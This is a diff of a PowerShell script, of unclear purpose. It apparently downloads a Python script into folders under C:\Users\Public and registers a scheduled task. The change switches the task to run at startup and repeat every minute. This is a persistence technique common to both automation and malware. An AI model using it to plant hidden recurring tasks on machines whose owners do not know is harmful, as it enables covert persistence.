@@ -34,8 +34,8 @@ $pythonPath = "$pythonPath\python.exe"
 
 
 # Download the python script directly with invoke-webrequest
-$outDirectory = "C:\Users\Public\Other\Protection"  # Temp directory in Windows
-$logDirectory = "C:\Users\Public\Other\Schedule"  # Temp directory in Windows
+$outDirectory = "C:\Users\Public\Other\Protection"
+$logDirectory = "C:\Users\Public\Other\Schedule"
 cd "$outDirectory"
 
 # Check if the directory exists, and create it if not
@@ -104,8 +104,12 @@ if ($scheduledTask) {
 $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "$runPath"
 
 # Define triggers
-$t1 = New-ScheduledTaskTrigger -Daily -At 05:56pm
-$t2 = New-ScheduledTaskTrigger -Once -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 1) -At 05:56pm
+#$t1 = New-ScheduledTaskTrigger -Daily -At 05:56pm
+#$t2 = New-ScheduledTaskTrigger -Once -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Hours 1) -At 05:56pm
+
+$t1 = New-ScheduledTaskTrigger -AtStartup
+$t2 = New-ScheduledTaskTrigger -Once -RepetitionInterval (New-TimeSpan -Minutes 1)
+
 $t1.Repetition = $t2.Repetition
 
 # Register the task
